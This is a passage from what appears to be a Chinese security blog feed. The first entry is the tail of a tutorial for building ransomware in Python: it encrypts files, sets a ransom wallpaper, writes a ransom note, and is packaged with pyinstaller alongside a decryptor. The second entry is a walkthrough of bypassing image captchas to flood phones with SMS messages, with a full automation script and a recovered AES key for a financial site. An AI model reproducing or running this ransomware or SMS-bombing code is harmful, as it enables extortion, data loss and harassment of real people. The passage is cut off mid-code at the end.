<span class="comment"># 创建并写入文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取文件的绝对路径</span></span><br><span class="line">    file_path = os.path.abspath(file_name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打开文件</span></span><br><span class="line">    os.startfile(file_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 获取当前运行的exe文件的路径</span></span><br><span class="line">    exe_path = os.path.abspath(sys.executable)</span><br><span class="line">    <span class="comment"># 获取文件名</span></span><br><span class="line">    exe_name = os.path.basename(exe_path)</span><br><span class="line"></span><br><span class="line">    target_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> target_list_str.split(<span class="string">&quot;.&quot;</span>):</span><br><span class="line">        target_list.append(i.strip())</span><br><span class="line">    <span class="comment"># print(target_list)</span></span><br><span class="line">    encrypt(os.getcwd()) <span class="comment">#此处自定义想要加密的目录名称</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置壁纸的路径</span></span><br><span class="line">    image_path = resource_path(os.path.join(<span class="string">&quot;res&quot;</span>,<span class="string">&quot;background.png&quot;</span>))</span><br><span class="line">    <span class="comment"># print(image_path)</span></span><br><span class="line"></span><br><span class="line">    warnning()  <span class="comment"># 弹窗告警框</span></span><br><span class="line">    <span class="comment"># 调用函数设置壁纸</span></span><br><span class="line">    set_wallpaper(image_path)</span><br><span class="line">    <span class="comment"># 生成勒索信并打开</span></span><br><span class="line">    write_letter()</span><br></pre></td></tr></table></figure><h1 id="三、解密文件制作"><a href="#三、解密文件制作" class="headerlink" title="三、解密文件制作"></a>三、解密文件制作</h1><p>相对于加密文件，这个就简单的多了。分为下面几个步骤：</p><p>1、调用私钥解密当前文件夹下所有.enc后缀的文件</p><p>2、和上面类似，将资源文件private.pem同脚本文件打包成exe</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyinstaller --add-data &#x27;./des/privkey.pem;des&#x27; -Fw .\decrypt.py</span><br></pre></td></tr></table></figure><h3 id="解密代码如下"><a href="#解密代码如下" class="headerlink" title="解密代码如下"></a>解密代码如下</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#预定义想要解密的文件后缀名，可以自己选择</span></span><br><span class="line">target_list_str = <span class="string">&quot;.txt .lnk .pdf .jpg .png .jpeg .doc .docx .xls .xlsx .ppt .pptx .zip .exe&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#生成资源文件目录访问路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resource_path</span>(<span class="params">relative_path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">getattr</span>(sys, <span class="string">&#x27;frozen&#x27;</span>, <span class="literal">False</span>): <span class="comment">#是否Bundle Resource</span></span><br><span class="line">        base_path = sys._MEIPASS</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        base_path = os.path.abspath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> os.path.join(base_path, relative_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密过程，当然如果当为攻击程序肯定不能发送到被害者服务器，此处是为了防止误操作将自己文件加密后的还原（或者确保受害者无法浏览到此代码也可一起发送）</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_decrypt</span>(<span class="params">file_name</span>):</span><br><span class="line">    prikey_name = resource_path((os.path.join(<span class="string">&quot;des&quot;</span>,<span class="string">&quot;privkey.pem&quot;</span>)))</span><br><span class="line">    <span class="keyword">if</span> file_name.split(<span class="string">&quot;.&quot;</span>)[-<span class="number">2</span>] <span class="keyword">in</span> target_list:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(prikey_name, mode=<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            priv = file.read()</span><br><span class="line">            priv = rsa.PrivateKey.load_pkcs1(priv)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_name, mode=<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            data = file.read()</span><br><span class="line"> </span><br><span class="line">        data = base64.b64decode(data.encode())</span><br><span class="line"> </span><br><span class="line">        res = []</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">128</span>):</span><br><span class="line">            temp_plaintext = rsa.decrypt(data[i:i + <span class="number">128</span>], priv)</span><br><span class="line">            res.append(temp_plaintext)</span><br><span class="line"> </span><br><span class="line">        last = <span class="string">b&#x27;&#x27;</span>.join(res)</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#删除加密文件</span></span><br><span class="line">        os.remove(file_name)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_name.replace(<span class="string">&quot;.enc&quot;</span>, <span class="string">&quot;&quot;</span>), mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(last)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(file_path):</span><br><span class="line">        file_names = os.listdir(file_path)</span><br><span class="line">        <span class="keyword">for</span> file_name <span class="keyword">in</span> file_names:</span><br><span class="line">            file_name = os.path.join(file_path, file_name)</span><br><span class="line">            <span class="keyword">if</span> os.path.isdir(file_name):</span><br><span class="line">                decrypt(file_name)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rsa_decrypt(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rsa_decrypt(file_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成告警弹窗</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">warnning</span>():</span><br><span class="line">    <span class="comment"># 初始化Tkinter</span></span><br><span class="line">    root = tk.Tk()</span><br><span class="line">    <span class="comment"># 隐藏主窗口</span></span><br><span class="line">    root.withdraw()</span><br><span class="line">    <span class="comment"># 弹出消息框</span></span><br><span class="line">    messagebox.showwarning(<span class="string">&quot;解密完成！！！&quot;</span>)</span><br><span class="line">    <span class="comment"># 关闭Tkinter</span></span><br><span class="line">    root.destroy()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    target_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> target_list_str.split(<span class="string">&quot;.&quot;</span>):</span><br><span class="line">        target_list.append(i.strip())</span><br><span class="line"></span><br><span class="line">    decrypt(os.getcwd())<span class="comment">#解密当前文件所在目录</span></span><br><span class="line">    warnning()</span><br></pre></td></tr></table></figure><h3 id="效果展示-1"><a href="#效果展示-1" class="headerlink" title="效果展示"></a>效果展示</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061752237.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急样本 </tag>
            
            <tag> 勒索 </tag>
            
            <tag> pyinstaller </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过图片验证码实现短信轰炸</title>
      <link href="/2024/06/01/%E7%BB%95%E8%BF%87%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%9E%E7%8E%B0%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8/"/>
      <url>/2024/06/01/%E7%BB%95%E8%BF%87%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%9E%E7%8E%B0%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>图片验证码是一种常见的安全验证方式，广泛应用于网站、APP等场景，用于区分人类用户和恶意机器人。然而，由于设计或实现上的缺陷，图片验证码可能存在一些问题，导致短信轰炸漏洞的发生。</p><p>常见的图片验证码的问题，一般以下几种：</p><p>1、图片验证码前端生成&amp;前端校验：通俗理解，就是调用前端JS中的函数生成一个验证码，那自然人工输入的验证码校验也是在前端完成的，这种没啥用，形同虚设。</p><p>2、图片验证码不失效：也就是服务端返回验证码之后，只要不再次请求，就一直可以使用，这也是好多年之前的系统常见的验证码漏洞。</p><p>3、验证码可识别：这玩意就比较鸡肋了，主要也是借用一些第三方的ocr做识别，比较好用的就是Python的第三方库—ddddocr了。</p><h1 id="二、案例一"><a href="#二、案例一" class="headerlink" title="二、案例一"></a>二、案例一</h1><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>某金融站点首页，通过短信验证码登录，在点击发送短信的时候，会弹出图片验证码：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012225238.png" alt="img">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012244906.png" alt="image-20240601224405877"> </p><p>成功输入图片验证码后，会向手机号发送短信验证码，具体数据包如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012225780.png" alt="image.png"> </p><h2 id="参数分析"><a href="#参数分析" class="headerlink" title="参数分析"></a>参数分析</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012226267.png" alt="image.png"> </p><p>对比上图，共有5个参数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mobile_tel：13888888888</span><br><span class="line">image_code：5321</span><br><span class="line">signature_data：M3IC7p1kH5bMMebPjl9H66rsZ+nf3rtYwMk8pUB9fPY=</span><br><span class="line">serial_no：738454630727417856</span><br><span class="line">org_code: ZYGJ001</span><br></pre></td></tr></table></figure><p>其中 signature_data 的值可以看到是经过加密后的，下面先说一下signature_data参数的逆向分析。</p><h3 id="signature-data"><a href="#signature-data" class="headerlink" title="signature_data"></a>signature_data</h3><p>全局关键字搜索，定位到signature_data位置</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012226786.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">signature_data ：t</span><br><span class="line"></span><br><span class="line">t = Object(h[&quot;a&quot;])(&quot;2&quot;.concat(this.mobile, &quot;random&quot;))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012226542.png" alt="image.png"> </p><p>其中 “Object(h[“a”])” 是函数名，”2”.concat(this.mobile, “random”)是参数值</p><p>假设手机号为：13888888888，则参数值为 213888888888random</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012227812.png" alt="image.png"> </p><p>很明显的AES特征，初步判断这块的验签使用的是AES加密。</p><p>下面就是调试出key 和 iv 的值：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">t</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> e = l.<span class="property">a</span>.<span class="title function_">parse</span>(<span class="variable language_">window</span>.<span class="property">LOCAL_CONFIG</span>.<span class="property">AES_KEY</span>)</span><br><span class="line">    , n = l.<span class="property">a</span>.<span class="title function_">parse</span>(<span class="variable language_">window</span>.<span class="property">LOCAL_CONFIG</span>.<span class="property">AES_IV</span>)</span><br><span class="line">    , i = l.<span class="property">a</span>.<span class="title function_">parse</span>(t)</span><br><span class="line">    , a = s.<span class="property">a</span>.<span class="title function_">encrypt</span>(i, e, &#123;</span><br><span class="line">      <span class="attr">iv</span>: n,</span><br><span class="line">      <span class="attr">mode</span>: d.<span class="property">a</span>.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line">      <span class="attr">padding</span>: g.<span class="property">a</span></span><br><span class="line">    &#125;);</span><br><span class="line">  <span class="keyword">return</span> r.<span class="property">a</span>.<span class="title function_">stringify</span>(a.<span class="property">ciphertext</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012227283.png" alt="image.png"> </p><p>key：qwertyuiopasdfgh、</p><p>iv：qwertyuiopasdfgh</p><p>使用在线工具验证，结果和上面的一样，参数分析结束</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012227137.png" alt="img"> </p><p>Python脚本计算signature_data：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    key = <span class="string">&#x27;qwertyuiopasdfgh&#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27;qwertyuiopasdfgh&#x27;</span></span><br><span class="line">    key = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    iv = iv.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = <span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = base64.encodebytes(AES.new(key=key, iv=iv, mode=AES.MODE_CBC).encrypt(pad(data, <span class="number">16</span>, style=<span class="string">&#x27;pkcs7&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> data.decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genSign</span>(<span class="params">phone</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;2&#x27;</span> + phone + <span class="string">&#x27;random&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><h3 id="serial-no"><a href="#serial-no" class="headerlink" title="serial_no"></a>serial_no</h3><p>serial_no：738454630727417856</p><p>一串数字，感觉应该和加解密没啥关系。</p><p>推测应该是图片验证码编号。一些金融机构都比较卷，服务端每次生成图片验证码，会同时生成一个编号，该编号会随着下一次请求和图片验证码一块发送到服务端，如果两者相对应，则校验通过；如果不对应，则失败！</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012227216.png" alt="img"> </p><p>一看数据包，果然如此。</p><h3 id="org-code"><a href="#org-code" class="headerlink" title="org_code"></a>org_code</h3><p>分析后，发现该参数在前端配置文件中写死了，没啥分析的必要</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012228958.png" alt="img"> </p><p>到这里，5个参数其实都已经确定了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mobile_tel：手机号</span><br><span class="line">image_code：图片验证码</span><br><span class="line">signature_data：AES加密后的sign</span><br><span class="line">serial_no：图片验证码编号</span><br><span class="line">org_code: 业务参数，固定为ZYGJ001</span><br></pre></td></tr></table></figure><h2 id="Python脚本实现自动化"><a href="#Python脚本实现自动化" class="headerlink" title="Python脚本实现自动化"></a>Python脚本实现自动化</h2><p>获得各个参数</p><ul><li>手机号：手动输入</li><li>图片验证码：URL获取，使用正则提取处图片的Base64，再使用dddocr来识别</li><li>signature_data：AES加密</li><li>serial_no：URL获取，使用正则提取出serial_no</li><li>org_code: 固定为ZYGJ001</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2024-05-11 14:43</span></span><br><span class="line"><span class="comment"># @Author: muhe</span></span><br><span class="line"><span class="comment"># @File: SMS_bur.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> ddddocr <span class="keyword">import</span> DdddOcr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    key = <span class="string">&#x27;qwertyuiopasdfgh&#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27;qwertyuiopasdfgh&#x27;</span></span><br><span class="line">    key = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    iv = iv.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = <span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = base64.encodebytes(AES.new(key=key, iv=iv, mode=AES.MODE_CBC).encrypt(pad(data, <span class="number">16</span>, style=<span class="string">&#x27;pkcs7&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> data.decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genSign</span>(<span class="params">phone</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;2&#x27;</span> + phone + <span class="string">&#x27;random&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getCode</span>():</span><br><span class="line">    url = <span class="string">&#x27;图片验证码接口&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;image_width&#x27;</span>: <span class="number">88</span>,</span><br><span class="line">        <span class="string">&#x27;image_height&#x27;</span>: <span class="number">34</span>,</span><br><span class="line">        <span class="string">&#x27;image_code_length&#x27;</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="string">&#x27;org_code&#x27;</span>: <span class="string">&#x27;ZYGJ001&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="comment"># print(response.text)</span></span><br><span class="line">    <span class="comment"># 正则提取返回包中的serial_no参数</span></span><br><span class="line">    pattern = <span class="string">r&#x27;&quot;serial_no&quot;:&quot;(\d+)&quot;&#x27;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, response.text)</span><br><span class="line">    serial_no = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 正则提取处返回包中的base64图片</span></span><br><span class="line">    pattern = <span class="string">r&#x27;&quot;image_data&quot;:&quot;data:image/png;base64,([^&quot;]+)&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, response.text)</span><br><span class="line">    captcha_code = <span class="keyword">match</span>.group(<span class="number">1</span>).strip(<span class="string">&#x27;&quot;&#x27;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># print(captcha_code)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># with open(&#x27;captcha.png&#x27;, &#x27;wb&#x27;) as f:</span></span><br><span class="line">    <span class="comment">#     f.write(base64.b64decode(captcha_code))</span></span><br><span class="line">    <span class="comment"># # 调用ddddocr识别</span></span><br><span class="line">    <span class="comment"># ocr = DdddOcr()</span></span><br><span class="line">    <span class="comment"># with open(&#x27;captcha.png&#x27;, &#x27;rb&#x27;) as f:</span></span><br><span class="line">    <span class="comment">#     img = f.read()</span></span><br><span class="line">    <span class="comment"># code = ocr.classification(img)</span></span><br><span class="line">    <span class="comment"># return code</span></span><br><span class="line">    ocr = DdddOcr()</span><br><span class="line">    code = ocr.classification(base64.b64decode(captcha_code))</span><br><span class="line">    <span class="keyword">return</span> code, serial_no</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendsms</span>(<span class="params">phone</span>):</span><br><span class="line">    url = <span class="string">&#x27;发送短信接口&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;busin_type&#x27;</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="string">&#x27;mobile_tel&#x27;</span>: phone,</span><br><span class="line">        <span class="string">&#x27;image_code&#x27;</span>: code,</span><br><span class="line">        <span class="string">&#x27;signature_data&#x27;</span>: genSign(phone),</span><br><span class="line">        <span class="string">&#x27;random_str&#x27;</span>: <span class="string">&#x27;random&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;serial_no&#x27;</span>: no,</span><br><span class="line">        <span class="string">&#x27;org_code&#x27;</span>: <span class="string">&#x27;ZYGJ001&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># phone = input(&quot;请输入需要发送验证码的手机号:&quot;)</span></span><br><span class="line">    phones = [<span class="string">&quot;13888888888&quot;</span>,<span class="string">&quot;13888888888 &quot;</span>,<span class="string">&quot;13888888888\t&quot;</span>]</span><br><span class="line">    <span class="comment"># signature = genSign()</span></span><br><span class="line">    <span class="comment"># print(signature)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(phones)):</span><br><span class="line">        code, no = getCode()  <span class="comment"># (&#x27;1524&#x27;, &#x27;731541934316728320&#x27;)</span></span><br><span class="line">        sendsms(phones[i])</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="三、案例二"><a href="#三、案例二" class="headerlink" title="三、案例二"></a>三、案例二</h1><p>常规来说涉及到加解密的，可以使用Python脚本来模拟执行，比较方便。。。</p><p>但也有一些站点，本身是不涉及加解密的，这样情况下，每次都要写脚本来做比较浪费时间，也不划算。</p><p>有什么简便方法吗？？？答案当然是有的！</p><h2 id="简单介绍-1"><a href="#简单介绍-1" class="headerlink" title="简单介绍"></a>简单介绍</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012229554.png" alt="img"> </p><p>1、首先，刷新验证码，抓个包简单看一下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012229520.png" alt="img"> </p><p>和上一个案例类似，都是返回了验证码图片的base64和验证码编号</p><p>2、输入手机号和验证码，抓包查看参数：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012229666.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OS: &quot;IOS&quot;</span><br><span class="line">code: &quot;0567&quot;</span><br><span class="line">codeId: &quot;034675&quot;</span><br><span class="line">deviceId: &quot;randomDeviceId&quot;</span><br><span class="line">loginName: &quot;13888888888&quot;</span><br><span class="line">orgNumber: &quot;1168&quot;</span><br><span class="line">version: &quot;1.0.0&quot;</span><br></pre></td></tr></table></figure><p>其中只有 “code”、”codeId”、”loginName”是可变的，剩下参数都是固定的。</p><p>并且 “code”和”codeId” 是验证码获取的接口返回的。</p><h2 id="dddocr-TangGo"><a href="#dddocr-TangGo" class="headerlink" title="dddocr+TangGo"></a>dddocr+TangGo</h2><h3 id="dddocr"><a href="#dddocr" class="headerlink" title="dddocr"></a>dddocr</h3><p>首先，burp抓包，借用capture-killer插件实现验证码识别</p><p>这块同样，编写Python脚本，使用Flash开启web服务，调用dddocr实现识别。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012229780.png" alt="img"> </p><p>识别成功率100%！！！</p><h3 id="TangGo"><a href="#TangGo" class="headerlink" title="TangGo"></a>TangGo</h3><p>但要实现短线轰炸，还需要提取出验证码的ID。。。</p><p>这块推荐一款新工具，<strong>TangGO</strong> 测试工具来进行提取图形验证码的ID以及img内容来爆破</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 工具下载地址</span><br><span class="line">https://tanggo.nosugar.tech/#/</span><br></pre></td></tr></table></figure><p>1、打开TangGo，找到模糊测试工具模块</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012230336.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012230741.png" alt="image.png"> </p><p>2、打开后，找到【自定义流程】模块，新建短信轰炸数据包发送前的操作流程</p><p><strong>（1）流程一：获取验证码数据包</strong></p><p>将获取到的响应包数据绑定到变量 “<strong>get_yzm</strong>“（这边变量后面会用到）。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012230256.png" alt="image.png"> </p><p>测试，成功获取到了响应数据包</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012230382.png" alt="img"> </p><p><strong>（2）流程二：提取流程一中的 image 和 id</strong></p><p>①新建流程之前，先获取到流程一中image和id提取对应的正则表达式。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012231971.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012231056.png" alt="image.png"> </p><p>右键选中要提取的内容的正则</p><p>如获取id值：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1717237921456-20c5682d-30ef-4008-aafa-869dac3207fe.png" alt="img"> </p><p>简单测试，成功获取到id值：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012231065.png" alt="img"> </p><p>这块选择第一个正则表达式： (?&lt;&#x3D;:{“id”:“).*?(?&#x3D;”,“image)</p><p>同理，可以获取到image的值，正则表达式为：(?&lt;&#x3D;,”image”:“).*?(?&#x3D;”})</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id：(?&lt;=\:\&#123;&quot;id&quot;\:&quot;).*?(?=&quot;\,&quot;image)</span><br><span class="line">image：(?&lt;=,&quot;image&quot;\:&quot;).*?(?=&quot;\&#125;)</span><br></pre></td></tr></table></figure><p>② 新建流程，获取image</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012231336.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012231734.png" alt="image.png"> </p><p>③新建流程，获取id</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012232756.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012232025.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012232789.png" alt="image.png"> </p><p>（3）流程三：调用dddocr对image进行识别</p><p>1、首先，简单介绍一下dddocr，它是Python的一个第三方库，可以实现对图片内容的识别</p><p>支持好多种方式识别：</p><ul><li>直接对图片文件进行识别</li><li>对传入的图片base64编码识别（这块也是在这块要使用的）</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ddddocr <span class="keyword">import</span> DdddOcr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    base64_str = <span 